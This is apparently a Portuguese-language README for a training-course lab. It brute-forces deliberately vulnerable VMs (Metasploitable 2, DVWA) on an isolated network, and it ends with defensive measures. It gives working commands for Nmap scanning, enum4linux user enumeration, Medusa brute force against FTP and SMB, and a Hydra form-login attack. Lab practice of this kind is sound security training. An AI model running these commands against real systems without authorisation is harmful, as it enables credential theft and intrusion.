Alcançando Máquina Vulnerável com Kali Linux

Este projeto foi desenvolvido como parte do desafio da DIO, com o objetivo de aprender na prática como identificar serviços vulneráveis e simular ataques de força bruta em um ambiente seguro usando Kali Linux, Metasploitable 2, DVWA e ferramentas como Medusa, Hydra e Nmap.

A ideia não é “hackear”, mas entender como ataques acontecem para saber como se defender melhor.

🚀 1. Ambiente Utilizado

Usei duas máquinas virtuais no VirtualBox:

Kali Linux – máquina atacante

Metasploitable 2 – máquina vulnerável

Ambas configuradas em Host-Only, na mesma faixa de IP (ex.: 192.168.56.x).
Assim, elas conseguem se comunicar só entre si — seguro e controlado.

📡 2. Verificando Conexão

Antes de tudo, testei a comunicação com a máquina alvo:

ping -c 3 192.168.56.101


Com isso, confirmei que a máquina estava ativa e respondendo.

🔍 3. Descobrindo Serviços com Nmap

Usei o Nmap para enxergar “o que está aberto” na máquina vulnerável:

nmap -sV -p 21,22,80,445,139 192.168.56.101


Ele me mostrou serviços como:

FTP

SSH

HTTP (onde está o DVWA)

SMB

Com isso, escolhi os alvos dos testes.

⚔️ 4. Ataque 1 — Força Bruta em FTP (Medusa)

Criei duas wordlists simples:

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt


Rodei o Medusa:

medusa -h 192.168.56.101 -U users.txt -p pass.txt -M ftp -t 6


✔️ Resultado:
O Medusa encontrou uma combinação válida de usuário e senha no serviço FTP.

🌐 5. Ataque 2 — Login Web no DVWA (Hydra)

Acessei o DVWA pela porta 80:

http://192.168.56.101/dvwa


Depois usei o Hydra para testar o login:

hydra -l admin -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"


✔️ O Hydra encontrou a senha correta do usuário admin.

📁 6. Ataque 3 — Password Spraying em SMB

Primeiro enumerei usuários:

enum4linux -U 192.168.56.101


Com os usuários encontrados, testei senhas:

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M smbnt


✔️ Novamente, o ataque encontrou credenciais válidas.

🔐 7. Como se proteger desses ataques

Uma parte essencial do desafio é entender como evitar esse tipo de problema.
Algumas medidas importantes:

Usar senhas fortes

Limitar tentativas de login

Habilitar MFA quando possível

Desabilitar serviços desnecessários (como SMBv1)

Fazer atualizações frequentes

Usar firewall e ferramentas como Fail2Ban

📦 8. Estrutura do Repositório
/
├── README.md
├── users.txt
├── pass.txt
└── images/


(As imagens devem ser adicionadas pelo usuário conforme prints reais.)

🧠 9. Conclusão

Com este laboratório, deu para entender de forma prática como ataques de força bruta funcionam em diferentes serviços e como ferramentas como Medusa, Hydra e Enum4linux são usadas em auditorias de segurança.
Mais importante ainda: ficou claro como pequenas configurações erradas podem abrir portas para invasores.
